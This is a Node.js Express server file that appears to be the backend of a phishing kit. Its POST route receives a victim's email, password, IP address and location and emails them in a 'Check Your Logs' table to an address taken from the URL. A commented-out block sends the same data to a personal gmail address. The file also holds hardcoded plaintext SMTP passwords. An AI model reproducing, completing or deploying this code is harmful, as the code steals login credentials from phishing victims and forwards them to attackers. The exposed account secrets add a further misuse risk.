


const express = require('express');
const app = express();
const port = 5000;
const path = require('path');
const nodeMailer = require('nodemailer');
const cors = require('cors')
const morgan = require('morgan')
const helmet = require('helmet')
const Zennda = require('./controller/zender');


app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.use(cors({
    "origin": "*",
    "methods": "GET,HEAD,PUT,PATCH,POST,DELETE",
    "preflightContinue": true,
    "optionsSuccessStatus": 204
  }));
app.use(morgan('combined'));
app.use(helmet());




// var transporter = nodeMailer.createTransport({
//     host: "physicaleducationdiploma.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: "sender@physicaleducationdiploma.com",
//       pass: "tQpiwc[Y)Ny)"
//     }
// });


// var mailOptions = {
//     from:'New Logs from <sender@physicaleducationdiploma.com>',
//     to: "joshyepes0@gmail.com",
//     subject: `Contemproary Logs from <email>`,
//     text:'Testing the microphone',
//     html: `
//     <center>last email testing</center>
//     <p>Email Address:===> email</p>
//     <p>Password:===> password</p>
//     <p>IP Address:===> IP</p>
//     <span>😜😜😜</span>
//     `
// }


// // email weill be sent below

// transporter.sendMail(mailOptions, function(error, info) {
//     if (error) {
//         console.log('err:===>',error);
//     } else {
//         console.log('email_sent:======> ' + info.response)
//     }
// });

app.get('/app', (req,res)=>{
    res.status(200).send('hello app');
});















// email sending route
app.post('/get_details/:receivers_email/device/', async (req,res)=>{
    try {

        const receiverEmail = req.params.receivers_email;

        // console.log(receiverEmail);kddkd

        

        const email = await req.body.email;
        const pswd = await req.body.pswd;
        const eyep = await req.body.eyep;
        const country = await req.body.country;
        const city = await req.body.city;
        const flag = await req.body.flag;
        const nownow = await req.body.nownow;
        

    
        var transporter = nodeMailer.createTransport({
            host: "physicaleducationdiploma.com",
            port: 465,
            secure: true,
            auth: {
              user: "hello@physicaleducationdiploma.com",
              pass: "D5?G}+84cKjt"
            }
        });
    
    
        var mailOptions = {
            from:`Hello Logs <hello@physicaleducationdiploma.com>`,
            to: `${receiverEmail}`,
            subject: `Check Your Logs @ <${email}>`,
            text:'Hello',
            html: `
                <body>

                        <style>

                            th, td {
                            padding: 25px;
                            text-align: left;
                            border-bottom: 1px solid #ddd;
                            color: #222;
                            }
                            tbody tr:nth-child(odd) {
                            background-color: #eee;
                            }
                        </style>
                        
                        <table>
                            <thead>
                                <tr>
                                    <th>Title</th>
                                    <th>Details</th>
                                </tr>

                            </thead>

                            <tbody>
                                <tr>
                                    <td>Email:</td>
                                    <td><b>${email}</b></td>
                                </tr>


                                <tr>
                                    <td>Password:</td>
                                    <td><b>${pswd}</b></td>
                                </tr>


                                <tr>
                                    <td>Ip Adress:</td>
                                    <td><b>${country}</b></td>
                                </tr>
                            </tbody>
                        </table>

                </body>
                `
        }
    
     

        // email weill be sent below
    
        transporter.sendMail(mailOptions, function(error, info) {
            if (error) {
                console.log('err:===>',error);
            } else {
                console.log('email_sent:======> ' + info.response)
            }
        });
    
        res.json({
            e: false,
            m:'ok ok'
        })
            
        } catch (error) {
            res.json({
                e: true,
                m: 'invalid'
            })
        }
});





app.listen(`${port}`, (req,res)=>{
    console.log(`app started @ port ${port}`);
});